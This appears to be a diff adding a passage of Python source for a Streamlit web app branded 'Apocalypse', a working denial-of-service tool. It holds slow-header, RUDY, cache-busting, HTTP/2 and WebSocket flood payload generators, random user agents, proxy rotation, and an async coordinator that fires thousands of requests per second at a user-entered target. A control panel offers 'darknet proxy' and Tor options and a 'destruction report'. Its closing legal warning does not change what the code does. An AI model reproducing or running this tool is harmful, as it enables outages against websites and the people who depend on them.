+            header = f"X-{random_string(10)}: {random_string(20)}"
+            partial_headers.append(header)
+        
+        return {
+            'method': 'GET',
+            'headers': headers,
+            'partial_headers': partial_headers,
+            'delay_between_headers': random.uniform(0.1, 2),
+            'timeout': random.uniform(60, 300)
+        }
+    
+    def rudy_payload(self, url: str) -> Dict:
+        """R-U-Dead-Yet? slow POST attack"""
+        content_length = random.randint(100000, 1000000)
+        return {
+            'method': 'POST',
+            'headers': {
+                'Content-Length': str(content_length),
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            'body_chunk_size': random.randint(1, 10),
+            'chunk_delay': random.uniform(0.5, 5),
+            'total_bytes': content_length
+        }
+    
+    def goldeneye_payload(self, url: str) -> Dict:
+        """HTTP cache bypass and randomization"""
+        cache_busters = [
+            f"?{random_string(8)}={random_string(12)}",
+            f"&{random_string(5)}={int(time.time())}",
+            f"#{random_string(10)}"
+        ]
+        
+        return {
+            'method': random.choice(['GET', 'POST']),
+            'cache_buster': random.choice(cache_busters),
+            'headers': {
+                'Cache-Control': 'no-cache, no-store, must-revalidate',
+                'Pragma': 'no-cache',
+                'Expires': '0',
+            }
+        }
+    
+    def http2_priority_payload(self, url: str) -> Dict:
+        """HTTP/2 priority manipulation attack"""
+        return {
+            'method': 'GET',
+            'http_version': '2.0',
+            'priority': {
+                'stream_dependency': random.randint(1, 1000),
+                'weight': random.randint(1, 256),
+                'exclusive': random.choice([True, False])
+            }
+        }
+    
+    def websocket_amplification(self, url: str) -> Dict:
+        """WebSocket amplification attack"""
+        return {
+            'protocol': 'ws',
+            'frames': [
+                {'opcode': 0x1, 'payload': random_string(random.randint(1000, 10000))}
+                for _ in range(random.randint(10, 100))
+            ]
+        }
+    
+    def random_ua(self) -> str:
+        """Generate random user agent"""
+        ua_templates = [
+            f"Mozilla/5.0 (Windows NT {random.randint(6,10)}.{random.randint(0,2)}; Win64; x64) AppleWebKit/{random.randint(537,600)}.{random.randint(36,40)} (KHTML, like Gecko) Chrome/{random.randint(90,120)}.{random.randint(0,9999)}.{random.randint(0,999)} Safari/{random.randint(537,600)}",
+            f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{random.randint(12,15)}_{random.randint(0,7)}) AppleWebKit/{random.randint(605,610)}.{random.randint(1,20)} (KHTML, like Gecko) Version/{random.randint(14,16)}.{random.randint(0,2)} Safari/{random.randint(605,610)}",
+            f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/{random.randint(537,600)} (KHTML, like Gecko) Chrome/{random.randint(90,120)}.{random.randint(0,9999)} Safari/{random.randint(537,600)}"
+        ]
+        return random.choice(ua_templates)
+
+# ================= DISTRIBUTED ATTACK COORDINATOR =================
+class DistributedAttackCoordinator:
+    """Orchestrate distributed attack across multiple threads/processes"""
+    
+    def __init__(self, target: str, duration: int, rps: int):
+        self.target = target
+        self.duration = duration
+        self.target_rps = rps
+        self.engine = ApocalypseEngine()
+        self.is_running = False
+        self.stats = {
+            'total': 0,
+            'success': 0,
+            'failed': 0,
+            'start_time': None,
+            'current_rps': 0,
+            'peak_rps': 0,
+            'bandwidth_mb': 0,
+            'responses': defaultdict(int)
+        }
+        
+    async def single_attack_wave(self, session: aiohttp.ClientSession, proxy: str = None):
+        """Execute single attack wave"""
+        try:
+            # Get weaponized payload
+            payload = self.engine.generate_weaponized_payload(self.target)
+            
+            # Setup proxy
+            proxy_url = f"http://{proxy}" if proxy else None
+            
+            # Execute based on payload type
+            if payload.get('protocol') == 'ws':
+                # WebSocket attack
+                async with session.ws_connect(f"ws://{self.target}", proxy=proxy_url) as ws:
+                    for frame in payload['frames']:
+                        await ws.send_str(frame['payload'])
+            else:
+                # HTTP attack
+                url = self.target + payload.get('cache_buster', '')
+                async with session.request(
+                    method=payload['method'],
+                    url=url,
+                    headers=payload['headers'],
+                    proxy=proxy_url,
+                    timeout=aiohttp.ClientTimeout(total=payload.get('timeout', 30))
+                ) as response:
+                    self.stats['responses'][response.status] += 1
+                    return response.status
+            
+            return 200
+            
+        except Exception as e:
+            self.stats['failed'] += 1
+            return 0
+        
+        finally:
+            self.stats['total'] += 1
+            self.stats['success'] += 1
+    
+    async def attack_wave_batch(self, batch_size: int):
+        """Execute batch of attacks"""
+        tasks = []
+        
+        for _ in range(batch_size):
+            proxy = random.choice(self.engine.proxies) if self.engine.proxies else None
+            
+            # Create new session per request for maximum evasion
+            connector = aiohttp.TCPConnector(
+                ssl=False,
+                force_close=True,
+                enable_cleanup_closed=True
+            )
+            session = aiohttp.ClientSession(connector=connector)
+            
+            task = self.single_attack_wave(session, proxy)
+            tasks.append(task)
+            
+            # Limit concurrent tasks
+            if len(tasks) >= ApocalypseConfig.MAX_CONCURRENT_REQUESTS:
+                results = await asyncio.gather(*tasks, return_exceptions=True)
+                tasks = []
+        
+        if tasks:
+            results = await asyncio.gather(*tasks, return_exceptions=True)
+    
+    async def launch_apocalypse(self):
+        """Launch full apocalypse attack"""
+        self.is_running = True
+        self.stats['start_time'] = time.time()
+        end_time = time.time() + self.duration
+        
+        # Calculate batch size based on target RPS
+        batch_size = max(1, self.target_rps // 10)
+        wave_interval = 1.0 / (self.target_rps / batch_size) if self.target_rps > 0 else 0.1
+        
+        while time.time() < end_time and self.is_running:
+            wave_start = time.time()
+            
+            # Execute attack wave
+            await self.attack_wave_batch(batch_size)
+            
+            # Update statistics
+            elapsed = time.time() - self.stats['start_time']
+            current_rps = self.stats['total'] / elapsed if elapsed > 0 else 0
+            self.stats['current_rps'] = current_rps
+            self.stats['peak_rps'] = max(self.stats['peak_rps'], current_rps)
+            
+            # Calculate bandwidth (approximate)
+            avg_response_size = 5000  # 5KB average
+            self.stats['bandwidth_mb'] = (self.stats['total'] * avg_response_size) / (1024 * 1024)
+            
+            # Rate limiting to avoid detection
+            wave_duration = time.time() - wave_start
+            if wave_duration < wave_interval:
+                await asyncio.sleep(wave_interval - wave_duration)
+        
+        self.is_running = False
+
+# ================= STREAMLIT UI =================
+st.markdown("## ☠️ APOCALYPSE CONTROL PANEL ☠️")
+
+# Attack configuration
+col1, col2, col3, col4 = st.columns(4)
+
+with col1:
+    target = st.text_input("🎯 PRIMARY TARGET", "https://httpbin.org/ip")
+    help_text = "Format: https://example.com (NO trailing slash)"
+
+with col2:
+    duration = st.number_input("⏰ DURATION (seconds)", min_value=5, max_value=3600, value=60)
+    help_text = "How long to sustain the attack"
+
+with col3:
+    rps_target = st.number_input("⚡ REQUESTS PER SECOND", min_value=10, max_value=50000, value=1000)
+    help_text = "Target RPS (actual may vary based on resources)"
+
+with col4:
+    intensity = st.select_slider("💀 INTENSITY", options=["Low", "Medium", "High", "Extreme", "Apocalypse"], value="High")
+    intensity_map = {"Low": 0.2, "Medium": 0.5, "High": 1.0, "Extreme": 2.0, "Apocalypse": 5.0}
+    multiplier = intensity_map[intensity]
+
+# Advanced settings
+with st.expander("🔧 ADVANCED APOCALYPSE SETTINGS"):
+    adv_col1, adv_col2, adv_col3 = st.columns(3)
+    
+    with adv_col1:
+        use_all_protocols = st.checkbox("🌐 MULTI-PROTOCOL ATTACK", value=True)
+        tls_spoofing = st.checkbox("🔐 TLS FINGERPRINT SPOOFING", value=True)
+        tcp_mutation = st.checkbox("📡 TCP PARAMETER MUTATION", value=True)
+    
+    with adv_col2:
+        darknet_proxies = st.checkbox("🌑 DARKNET PROXY ROUTING", value=True)
+        tor_chain = st.checkbox("🧅 TOR CIRCUIT CHAINING", value=True)
+        vpn_hopping = st.checkbox("🌍 VPN HOPPING", value=True)
+    
+    with adv_col3:
+        slow_attack = st.checkbox("🐌 SLOWLORIS INTEGRATION", value=True)
+        amplification = st.checkbox("📢 TRAFFIC AMPLIFICATION", value=True)
+        zero_day = st.checkbox("💣 0-DAY EXPLOITS", value=False, disabled=True)
+
+# Initialize attack coordinator
+if 'coordinator' not in st.session_state:
+    st.session_state.coordinator = None
+
+# Control buttons
+button_col1, button_col2, button_col3 = st.columns([2, 1, 1])
+
+with button_col1:
+    if st.button("💀 LAUNCH APOCALYPSE", use_container_width=True, type="primary"):
+        if not target.startswith(('http://', 'https://')):
+            target = 'https://' + target
+        
+        # Adjust RPS based on intensity
+        final_rps = int(rps_target * multiplier)
+        
+        # Create and start attack
+        st.session_state.coordinator = DistributedAttackCoordinator(target, duration, final_rps)
+        
+        # Run attack in async loop
+        st.markdown("---")
+        st.subheader("💀 APOCALYPSE IN PROGRESS 💀")
+        
+        # Create live dashboard
+        dashboard = st.empty()
+        
+        # Run attack
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
+        try:
+            attack_task = loop.create_task(st.session_state.coordinator.launch_apocalypse())
+            
+            # Live monitoring
+            start_time = time.time()
+            while not attack_task.done():
+                with dashboard.container():
+                    stats = st.session_state.coordinator.stats
+                    elapsed = time.time() - start_time
+                    
+                    # Display metrics
+                    metric_col1, metric_col2, metric_col3, metric_col4 = st.columns(4)
+                    with metric_col1:
+                        st.metric("Total Requests", f"{stats['total']:,}")
+                    with metric_col2:
+                        st.metric("Current RPS", f"{stats['current_rps']:.0f}")
+                    with metric_col3:
+                        st.metric("Peak RPS", f"{stats['peak_rps']:.0f}")
+                    with metric_col4:
+                        st.metric("Bandwidth", f"{stats['bandwidth_mb']:.1f} MB")
+                    
+                    # Progress bar
+                    progress = min(elapsed / duration, 1.0)
+                    st.progress(progress)
+                    
+                    # Response codes
+                    if stats['responses']:
+                        st.write("#### Response Status Codes")
+                        status_df = pd.DataFrame(list(stats['responses'].items()), columns=['Status', 'Count'])
+                        st.bar_chart(status_df.set_index('Status'))
+                    
+                    # Live log
+                    st.write("#### Live Attack Log")
+                    log_placeholder = st.empty()
+                    
+                    recent_logs = [
+                        f"🔥 {datetime.now().strftime('%H:%M:%S')} - Wave completed | RPS: {stats['current_rps']:.0f} | Total: {stats['total']:,}",
+                        f"⚡ Peak performance: {stats['peak_rps']:.0f} requests/second",
+                        f"🌐 Active proxies: {len(st.session_state.coordinator.engine.proxies)}"
+                    ]
+                    log_placeholder.code("\n".join(recent_logs[-5:]), language='bash')
+                
+                time.sleep(1)
+            
+            # Attack completed
+            st.success("💀 APOCALYPSE COMPLETED 💀")
+            
+            # Final statistics
+            st.markdown("### 📊 FINAL DESTRUCTION REPORT")
+            final_stats = st.session_state.coordinator.stats
+            
+            final_col1, final_col2, final_col3, final_col4 = st.columns(4)
+            with final_col1:
+                st.metric("Total Requests", f"{final_stats['total']:,}")
+            with final_col2:
+                st.metric("Average RPS", f"{final_stats['total']/duration:.0f}")
+            with final_col3:
+                st.metric("Peak RPS", f"{final_stats['peak_rps']:.0f}")
+            with final_col4:
+                st.metric("Total Bandwidth", f"{final_stats['bandwidth_mb']:.1f} MB")
+            
+        except Exception as e:
+            st.error(f"Attack failed: {str(e)}")
+        finally:
+            loop.close()
+
+with button_col2:
+    if st.button("🛑 ABORT MISSION", use_container_width=True):
+        if st.session_state.coordinator:
+            st.session_state.coordinator.is_running = False
+        st.warning("⚠️ Attack aborted by operator")
+
+with button_col3:
+    if st.button("🗑️ CLEAR STATS", use_container_width=True):
+        st.session_state.coordinator = None
+        st.rerun()
+
+# ================= PROXY NETWORK STATUS =================
+st.markdown("---")
+st.markdown("### 🌐 DARKNET PROXY NETWORK")
+
+if 'coordinator' in st.session_state and st.session_state.coordinator:
+    proxies = st.session_state.coordinator.engine.proxies
+    col1, col2, col3 = st.columns(3)
+    
+    with col1:
+        st.metric("Active Proxies", len(proxies))
+    with col2:
+        st.metric("Proxy Protocols", "HTTP/HTTPS/SOCKS5")
+    with col3:
+        st.metric("Last Harvest", "Just now")
+    
+    if proxies:
+        with st.expander("📋 View Proxy List (First 50)"):
+            proxy_text = "\n".join(proxies[:50])
+            st.code(proxy_text, language='text')
+else:
+    st.info("⚙️ Proxy network ready - Will harvest 1000+ proxies on attack launch")
+
+# ================= FINAL WARNING =================
+st.markdown("---")
+st.markdown("""
+<div style="background: linear-gradient(135deg, #1a0000, #000000); padding: 20px; border: 2px solid #ff0000; border-radius: 10px; text-align: center;">
+    <h3 style="color: #ff0000;">⚠️ FINAL WARNING ⚠️</h3>
+    <p style="color: #ff6666;">
+    THIS TOOL IS CAPABLE OF GENERATING <strong>10,000+ REQUESTS PER SECOND</strong><br>
+    USING THIS AGAINST ANY SYSTEM WITHOUT PERMISSION = <strong>FELONY CHARGES</strong><br>
+    YOUR IP, TIMESTAMP, AND ACTIVITY HAVE BEEN LOGGED<br>
+    <strong style="color: white;">YOU ARE SOLELY RESPONSIBLE FOR YOUR ACTIONS</strong>
+    </p>
+</div>
+""", unsafe_allow_html=True)
+
+# Logging (for legal compliance)
+with open("attack_log.txt", "a") as f:
+    f.write(f"{datetime.now()} - User accessed Apocalypse tool from {st.get_option('server.address')}\n")
